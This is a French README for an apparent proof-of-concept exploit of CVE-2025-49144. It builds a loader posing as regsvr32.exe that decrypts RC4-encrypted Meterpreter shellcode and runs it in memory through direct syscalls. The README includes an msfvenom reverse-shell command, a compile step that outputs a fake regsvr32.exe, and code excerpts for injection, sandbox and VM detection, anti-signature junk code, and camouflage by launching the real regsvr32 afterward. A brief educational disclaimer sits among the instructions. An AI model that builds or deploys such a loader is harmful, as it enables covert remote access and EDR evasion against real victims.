# 🔓 CVE-2025-49144

Ce projet illustre un PoC exploitant la vulnérabilité **CVE-2025-49144**, en détournant l’appel à `regsvr32.exe` (LOLBIN hijacking) pour exécuter du shellcode chiffré en **RC4**, injecté en mémoire via des **appels système directs** grâce à [SysWhispers3](https://github.com/klezVirus/SysWhispers3).  
Le shellcode utilisé est typiquement un **Meterpreter** généré via `msfvenom`.

---

## 📦 Requirements

- Python 3.x
- `msfvenom` (Metasploit Framework)
- MinGW-w64 (`x86_64-w64-mingw32-gcc`)
- `ml64.exe` (Microsoft assembler for `syscalls.asm`)
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3)
- Windows machine (pour test et debug)

---

## 💡 Fonctionnalités

* Chiffrement RC4 du shellcode avec clé en dur
* Détection sandbox / VM optionnelle
* Appels système directs : `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtTerminateProcess`
* Exécution payload **in-memory** (aucune écriture sur disque)

---

## ⚙️ Étapes de génération

### 1. Générer le shellcode avec msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXX -f c -o shellcode.txt
```

---

### 2. Formater le shellcode pour Python

```bash
python3 format_shellcode_txt.py
```

Ce script :
- Lit le contenu du fichier `shellcode.txt`
- Extrait et nettoie le shellcode brut
- Affiche un formatage compatible Python (`b"\xfc\x..."`)
- 📌 **Copier** la sortie dans la variable `shellcode = (...)` du fichier `rc4_shellcode.py`

---

### 3. Chiffrer le shellcode et générer un header C

```bash
python3 rc4_shellcode.py
```

Cela va :
- Chiffrer le shellcode avec RC4 (clé définie dans le script)
- Génére un fichier `encrypted_payload.h` contenant :
  ```c
  unsigned char payload[] = { 0xAA, 0xBB, ... };
  unsigned int payload_len = ...;
  ```

---

### 4. Compiler avec MinGw64

```bash
x86_64-w64-mingw32-gcc loader.c syscalls.c syscalls.obj -o "C:\DEV\regsvr32.exe" -mwindows -s -O2
```

---

## 📂 Fichiers

### `format_shellcode_txt.py`

Convertit un shellcode brut C (`shellcode.txt`) en format `bytes` Python pour intégration dans `rc4_shellcode.py`.

---

### `rc4_shellcode.py`

- Contient une **clé RC4 en dur** (`b"hola"`)
- Chiffre le shellcode
- Génére un header C (`encrypted_payload.h`) contenant le payload chiffré

---

### `loader.c`

Le loader principal qui :
- Inclut le shellcode chiffré depuis `encrypted_payload.h`
- Le déchiffre en mémoire avec `rc4()`
- Alloue, copie, rend exécutable puis exécute le shellcode via **SysWhispers3**
- Simule l’appel à `regsvr32.exe` réel pour camoufler l'exécution
- Intègre une détection sandbox optionnelle et du code "junk"

---

### `syscalls.c/.h/.obj`

Générés avec [SysWhispers3](https://github.com/klezVirus/SysWhispers3). Contiennent les wrappers nécessaires aux syscalls directs, pour contourner certains EDRs.

---

## 🔍 Détails du Code

### RC4 (chiffrement/déchiffrement)

```c
void rc4(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen) { ... }
```

---

### Fonction `junk`

```c
void junk() {
    int a = rand() % 123;
    if (a == 42) MessageBoxA(NULL, "Noise", "Filler", MB_OK);
}
```

---

### Détection sandbox

```c
BOOL is_sandbox_environment() { ... }
```

---

### Exécution via Syscalls

```c
Sw3NtAllocateVirtualMemory(...)
memcpy(...)
rc4(...)
Sw3NtProtectVirtualMemory(...)
((void(*)())baseAddr)();
```

---

### Exécution de regsvr32.exe

```c
GetSystemDirectoryA(sysPath, MAX_PATH);
strcat(sysPath, "\\regsvr32.exe");
CreateProcessA(...);
```

---

## 🧷 Notes complémentaires

* Pense à regénérer `encrypted_payload.h` à chaque nouveau shellcode

---

## ⚠️ Avertissement légal

> 🔬 Ce projet est fourni uniquement à des fins pédagogiques et de **recherche en sécurité offensive**.  
> 🛑 L’auteur décline toute responsabilité en cas d’usage malveillant.

---

# 🧠 Analyse détaillée du script principal (`loader.c`)

Ce loader C est le cœur du projet. Il permet de :
1. Déchiffrer un shellcode chiffré en RC4
2. L’exécuter directement en mémoire à l’aide de **syscalls** (via SysWhispers3)
3. Dissimuler son comportement en appelant `regsvr32.exe` après exécution

---

## 🔐 RC4 : Chiffrement/Déchiffrement en mémoire

```c
void rc4(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen)
```

> Implémentation complète de RC4 :
- Initialise la **S-box** (tableau de permutation)
- Applique le **Key Scheduling Algorithm** (KSA)
- Applique le **Pseudo-Random Generation Algorithm** (PRGA)
- Chiffre ou déchiffre avec un XOR du flux RC4 généré

---

## 🌀 `junk()` – Antianalyse statique

```c
void junk() {
    int a = rand() % 123;
    if (a == 42) MessageBoxA(NULL, "Noise", "Filler", MB_OK);
}
```

> Ajoute une fonction inutile qui ne s'exécute presque jamais mais modifie l’empreinte binaire à chaque compilation (→ anti-hashing simple).

---

## 🧪 `is_sandbox_environment()` – Détection d’environnement

Vérifie plusieurs heuristiques :
- **RAM < 2 Go** (machine limitée)
- **CPU < 2 cœurs**
- **Inactivité > 5 minutes** (comportement non humain)
- **Uptime < 30 secondes**
- **VM détectée via clés BIOS/UEFI** (VMware, VirtualBox, QEMU, Xen, SeaBIOS)

Retourne `TRUE` si au moins une condition est remplie → permet d’abandonner si détecté.

---

## 🧬 Fonction `WinMain` – Logique centrale

### 🎲 Initialisation

```c
srand(time(NULL));
junk(); // Ajoute du bruit au binaire
```

### 🛡️ Vérification Sandbox (optionnelle)

```c
#if ENABLE_SANDBOX_CHECK
    if (is_sandbox_environment()) {
        Sw3NtTerminateProcess(...);
    }
#endif
```

Si activée, met fin au processus **avant exécution du payload** en cas d'environnement douteux.

---

### 💾 Allocation mémoire et injection

```c
PVOID baseAddr = NULL;
SIZE_T regionSize = payload_len;
ULONG oldProtect = 0;

if (Sw3NtAllocateVirtualMemory(...) == 0) {
    memcpy(baseAddr, payload, payload_len);
    rc4(...); // Déchiffrement
```

- Alloue de la mémoire RW
- Copie le shellcode chiffré (`payload`)
- Déchiffre **en place** dans le buffer

---

### 🧨 Passage en mémoire exécutable et exécution

```c
Sw3NtProtectVirtualMemory(..., PAGE_EXECUTE_READ, ...);
((void(*)())baseAddr)(); // Jump to shellcode
```

Le payload est désormais **RX** → exécution directe.

En cas d’échec, un `TerminateProcess` (syscall) est appelé avec un code erreur.

---

### 🎭 Camouflage post-exécution

```c
GetSystemDirectoryA(sysPath, ...);
strcat(sysPath, "\\regsvr32.exe");
CreateProcessA(...);
```

- Construit le chemin vers le vrai `C:\Windows\System32\regsvr32.exe`
- Lance `regsvr32.exe` avec les arguments initiaux → masque l’activité réelle du loader

---

### 🧹 Nettoyage final

```c
Sw3NtTerminateProcess(GetCurrentProcess(), 0);
```

Termine proprement le processus via **syscall**, sans laisser de trace dans les journaux classiques.

---

## ✅ Résumé

| Composant            | Rôle                                                                 |
|----------------------|----------------------------------------------------------------------|
| `rc4()`              | Déchiffre le payload à la volée en mémoire                          |
| `junk()`             | Perturbe les signatures statiques et modifie l’empreinte binaire     |
| `is_sandbox...()`    | Évite l’exécution dans un environnement virtuel ou d’analyse         |
| `WinMain()`          | Orchestration : alloue, déchiffre, exécute, masque, nettoie          |

---

Cette analyse peut être ajoutée au `README.md` pour enrichir la documentation technique.
